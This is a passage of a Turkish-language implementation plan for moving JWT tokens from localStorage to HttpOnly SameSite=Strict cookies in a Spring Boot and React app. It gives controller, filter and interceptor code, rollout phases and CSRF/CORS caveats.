public ResponseCookie clearAccessTokenCookie() {
    return ResponseCookie.from("accessToken", "")
            .httpOnly(true)
            .secure(cookieSecure)
            .sameSite("Strict")
            .path("/api/v1")
            .maxAge(Duration.ZERO)
            .build();
}
```

**Güncellemeler:**
```java
// Refresh token cookie metodunu güncelle
public ResponseCookie createRefreshTokenCookie(String token) {
    Duration maxAge = Duration.ofSeconds(604800); // 7 gün (saniye cinsinden)
    
    return ResponseCookie.from(REFRESH_TOKEN_COOKIE_NAME, token)
            .httpOnly(true)
            .secure(cookieSecure) // Production'da true olmalı
            .sameSite("Strict") // Lax → Strict
            .path(COOKIE_PATH)
            .maxAge(maxAge)
            .build();
}
```

#### 2. AuthController.java Güncellemesi

**Login Metodu:**
```java
@PostMapping("/login")
public ResponseEntity<ApiResponse<LoginResponse>> login(
        @Valid @RequestBody LoginRequest request,
        HttpServletRequest httpRequest) {
    
    String tenantId = httpRequest.getHeader(TENANT_HEADER);
    if (tenantId == null || tenantId.isBlank()) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(ApiResponse.error("BAD_REQUEST", "X-Tenant-ID header is required"));
    }
    
    LoginResponse response = authService.login(request, tenantId);
    
    // Access token cookie oluştur
    ResponseCookie accessTokenCookie = cookieUtil.createAccessTokenCookie(response.getToken());
    
    // Refresh token cookie oluştur
    ResponseCookie refreshTokenCookie = cookieUtil.createRefreshTokenCookie(response.getRefreshToken());
    
    // Token'ları response body'den çıkar
    LoginResponse responseWithoutTokens = LoginResponse.builder()
            .user(response.getUser())
            .expiresIn(response.getExpiresIn())
            .build();
    
    // Her iki cookie'yi de header'a ekle
    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, accessTokenCookie.toString())
            .header(HttpHeaders.SET_COOKIE, refreshTokenCookie.toString())
            .body(ApiResponse.success(responseWithoutTokens, "Login successful"));
}
```

**Refresh Metodu:**
```java
@PostMapping("/refresh")
public ResponseEntity<ApiResponse<RefreshTokenResponse>> refreshToken(
        @CookieValue(name = "refreshToken", required = false) String refreshToken,
        @CookieValue(name = "accessToken", required = false) String accessToken) {
    
    if (refreshToken == null || refreshToken.isBlank()) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(ApiResponse.error("UNAUTHORIZED", "Refresh token not found"));
    }
    
    try {
        RefreshTokenResponse response = authService.refreshToken(refreshToken);
        
        // Yeni access token cookie oluştur
        ResponseCookie accessTokenCookie = cookieUtil.createAccessTokenCookie(response.getAccessToken());
        
        // Response body'den token'ları çıkar
        RefreshTokenResponse responseWithoutTokens = RefreshTokenResponse.builder()
                .expiresIn(response.getExpiresIn())
                .build();
        
        ResponseEntity.BodyBuilder responseBuilder = ResponseEntity.ok()
                .header(HttpHeaders.SET_COOKIE, accessTokenCookie.toString());
        
        // Token rotation kontrolü
        if (response.getRefreshToken() != null && !response.getRefreshToken().isBlank()) {
            ResponseCookie refreshTokenCookie = cookieUtil.createRefreshTokenCookie(response.getRefreshToken());
            responseBuilder.header(HttpHeaders.SET_COOKIE, refreshTokenCookie.toString());
        }
        
        return responseBuilder.body(ApiResponse.success(responseWithoutTokens, "Token refreshed successfully"));
    } catch (Exception e) {
        // Hata durumunda cookie'leri temizle
        ResponseCookie clearAccessCookie = cookieUtil.clearAccessTokenCookie();
        ResponseCookie clearRefreshCookie = cookieUtil.clearRefreshTokenCookie();
        
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .header(HttpHeaders.SET_COOKIE, clearAccessCookie.toString())
                .header(HttpHeaders.SET_COOKIE, clearRefreshCookie.toString())
                .body(ApiResponse.error("UNAUTHORIZED", "Invalid or expired refresh token"));
    }
}
```

#### 3. JwtAuthenticationFilter.java Güncellemesi

**Token Okuma:**
```java
private String extractTokenFromRequest(HttpServletRequest request) {
    // Önce cookie'den oku
    Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if ("accessToken".equals(cookie.getName())) {
                return cookie.getValue();
            }
        }
    }
    
    // Fallback: Authorization header'dan oku (backward compatibility)
    String bearerToken = request.getHeader(AUTHORIZATION_HEADER);
    if (StringUtils.hasText(bearerToken) && bearerToken.startsWith(BEARER_PREFIX)) {
        return bearerToken.substring(BEARER_PREFIX.length());
    }
    
    return null;
}
```

#### 4. Logout Endpoint Ekleme

**Yeni Endpoint:**
```java
@PostMapping("/logout")
public ResponseEntity<ApiResponse<Void>> logout(
        @CookieValue(name = "refreshToken", required = false) String refreshToken) {
    
    // Refresh token'ı revoke et (varsa)
    if (refreshToken != null && !refreshToken.isBlank()) {
        try {
            authService.revokeRefreshToken(refreshToken);
        } catch (Exception e) {
            log.warn("Failed to revoke refresh token during logout: {}", e.getMessage());
        }
    }
    
    // Cookie'leri temizle
    ResponseCookie clearAccessCookie = cookieUtil.clearAccessTokenCookie();
    ResponseCookie clearRefreshCookie = cookieUtil.clearRefreshTokenCookie();
    
    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, clearAccessCookie.toString())
            .header(HttpHeaders.SET_COOKIE, clearRefreshCookie.toString())
            .body(ApiResponse.success(null, "Logout successful"));
}
```

### Frontend Değişiklikleri

#### 1. api.js Güncellemesi

**Request Interceptor:**
```javascript
apiClient.interceptors.request.use(
    (config) => {
        // Access token artık cookie'de, header'a ekleme gerekmez
        // Cookie otomatik gönderilir (withCredentials: true)
        
        // Tenant ID'yi al ve header'a ekle
        let tenantId = localStorage.getItem('tenantId');
        if (!tenantId) {
            const authData = localStorage.getItem('terra-auth-storage');
            if (authData) {
                try {
                    const parsed = JSON.parse(authData);
                    tenantId = parsed?.state?.user?.tenantId || parsed?.user?.tenantId;
                } catch (e) {
                    // Ignore parse errors
                }
            }
        }
        
        if (tenantId && tenantId !== 'null' && tenantId !== 'undefined') {
            config.headers['X-Tenant-ID'] = tenantId;
        }
        
        return config;
    },
    (error) => Promise.reject(error)
);
```

**Response Interceptor:**
```javascript
apiClient.interceptors.response.use(
    (response) => {
        // Response data sadeleştirme (aynı)
        if (response.data && typeof response.data === 'object') {
            if ('data' in response.data && 'success' in response.data) {
                if (response.data.success === true) {
                    return response.data.data;
                }
            }
        }
        return response;
    },
    async (error) => {
        const originalRequest = error.config;
        
        if (error.response?.status === 401) {
            if (originalRequest.url === '/v1/auth/refresh' || originalRequest._retry) {
                // Logout yap
                isRefreshing = false;
                failedQueue = [];
                // Cookie'ler otomatik temizlenecek (backend'den)
                window.location.href = '/login';
                return Promise.reject(error);
            }
            
            if (isRefreshing) {
                // Queuing (aynı)
                return new Promise((resolve, reject) => {
                    failedQueue.push({ resolve, reject });
                }).then(() => {
                    return apiClient(originalRequest);
                });
            }
            
            isRefreshing = true;
            originalRequest._retry = true;
            
            try {
                // Refresh isteği (cookie otomatik gönderilir)
                const baseURL = import.meta.env.VITE_API_URL || '/api';
                const response = await axios.post(
                    '/v1/auth/refresh',
                    {},
                    {
                        withCredentials: true,
                        baseURL: baseURL
                    }
                );
                
                // Yeni access token cookie'de (otomatik)
                // Response body'den token okuma gerekmez
                processQueue(null, null); // Token artık cookie'de
                return apiClient(originalRequest);
            } catch (refreshError) {
                processQueue(refreshError, null);
                isRefreshing = false;
                failedQueue = [];
                window.location.href = '/login';
                return Promise.reject(refreshError);
            } finally {
                isRefreshing = false;
            }
        }
        
        const normalizedError = normalizeError(error);
        return Promise.reject(normalizedError);
    }
);
```

#### 2. authStore.js Güncellemesi

**Login Metodu:**
```javascript
login: async ({ email, password, tenantId }) => {
    const finalTenantId = tenantId || get().discoveredTenantId || localStorage.getItem('tenantId');
    
    if (!finalTenantId) {
        throw new Error('Tenant ID is required for login');
    }
    
    set({ loading: true, error: null });
    
    try {
        const response = await apiClient.post(
            '/v1/auth/login',
            { email, password },
            { headers: { 'X-Tenant-ID': tenantId } }
        );
        
        // Access token artık cookie'de, localStorage'a yazma gerekmez
        // Sadece tenant ID ve user bilgilerini sakla
        localStorage.setItem('tenantId', response.user.tenantId.toString());
        
        set({
            user: response.user,
            isAuthenticated: true,
            loading: false,
            error: null,
            discoveredTenantId: null
        });
    } catch (error) {
        set({ error, loading: false });
        throw error;
    }
}
```

**Logout Metodu:**
```javascript
logout: async () => {
    try {
        // Backend logout endpoint'ini çağır (cookie'leri temizler)
        await apiClient.post('/v1/auth/logout');
    } catch (error) {
        // Hata olsa bile devam et
        console.error('Logout error:', error);
    }
    
    // LocalStorage temizle
    localStorage.removeItem('tenantId');
    
    // Store'u sıfırla
    set({
        user: null,
        isAuthenticated: false,
        error: null,
        loading: false,
        discoveredTenantId: null
    });
    
    // Hard redirect
    window.location.href = '/login';
}
```

---

## 📝 Implementasyon Adımları

### Faz 1: Backend Hazırlık (1-2 gün)

1. ✅ CookieUtil.java'ya access token cookie metodları ekle
2. ✅ CookieUtil.java'da Secure ve SameSite ayarlarını güncelle
3. ✅ AuthController.java'da login metodunu güncelle
4. ✅ AuthController.java'da refresh metodunu güncelle
5. ✅ AuthController.java'ya logout endpoint'i ekle
6. ✅ JwtAuthenticationFilter.java'da cookie okuma desteği ekle
7. ✅ AuthService.java'ya revokeRefreshToken metodu ekle
8. ✅ Test: Login, Refresh, Logout endpoint'leri

### Faz 2: Backend Test (1 gün)

1. ✅ Unit testler yaz
2. ✅ Integration testler yaz
3. ✅ Cookie ayarlarını test et
4. ✅ Token rotation'ı test et
5. ✅ Logout cookie temizlemeyi test et

### Faz 3: Frontend Güncelleme (1-2 gün)

1. ✅ api.js request interceptor'ı güncelle
2. ✅ api.js response interceptor'ı güncelle
3. ✅ authStore.js login metodunu güncelle
4. ✅ authStore.js logout metodunu güncelle
5. ✅ localStorage token okuma/yazma işlemlerini kaldır

### Faz 4: Frontend Test (1 gün)

1. ✅ Login akışını test et
2. ✅ Token refresh akışını test et
3. ✅ Logout akışını test et
4. ✅ Concurrent request'leri test et
5. ✅ Cookie ayarlarını browser'da kontrol et

### Faz 5: Production Hazırlık (1 gün)

1. ✅ application.yaml'da Secure=true yap
2. ✅ CORS origin'leri production URL'lerine güncelle
3. ✅ Environment variable'ları ayarla
4. ✅ Documentation güncelle
5. ✅ Rollback planı hazırla

### Faz 6: Deployment ve Monitoring (1 gün)

1. ✅ Staging environment'ta test et
2. ✅ Production'a deploy et
3. ✅ Cookie'leri browser'da kontrol et
4. ✅ Error log'ları izle
5. ✅ Kullanıcı geri bildirimlerini topla

---

## ⚠️ Dikkat Edilmesi Gerekenler

### 1. Backward Compatibility

**Sorun:** Mevcut kullanıcılar localStorage'da token saklıyor

**Çözüm:**
- JwtAuthenticationFilter'da hem cookie hem header okuma desteği
- Migration period'da her iki yöntem de desteklenmeli
- Frontend'de localStorage token kontrolü yapılabilir (fallback)

### 2. CORS Konfigürasyonu

**Sorun:** Cookie gönderimi için CORS ayarları kritik

**Çözüm:**
- `allowCredentials: true` zorunlu
- `allowedOrigins` production URL'lerine güncellenmeli
- Preflight request'ler için OPTIONS desteği

### 3. Cookie Boyutu

**Sorun:** JWT token'lar büyük olabilir (4KB limit)

**Çözüm:**
- Permissions compression zaten var
- Token içeriğini minimize et
- Gerekirse token'ı veritabanında sakla, cookie'de sadece ID

### 4. SameSite=Strict Etkisi

**Sorun:** Cross-site redirect'lerde cookie gönderilmez

**Çözüm:**
- OAuth redirect'leri için özel handling gerekebilir
- Email link'lerinde dikkatli olunmalı
- Test senaryoları hazırlanmalı

### 5. CSRF Koruması

**Sorun:** Cookie kullanımında CSRF riski

**Çözüm:**
- SameSite=Strict genellikle yeterli
- Gerekirse CSRF token eklenebilir
- Double-submit cookie pattern kullanılabilir

---

## 📚 Referanslar

- [OWASP JWT Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Spring Security: CSRF Protection](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html)
- [OWASP: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

**Son Güncelleme:** 27 Ocak 2026  
**Versiyon:** 1.0  
**Hazırlayan:** AI Assistant
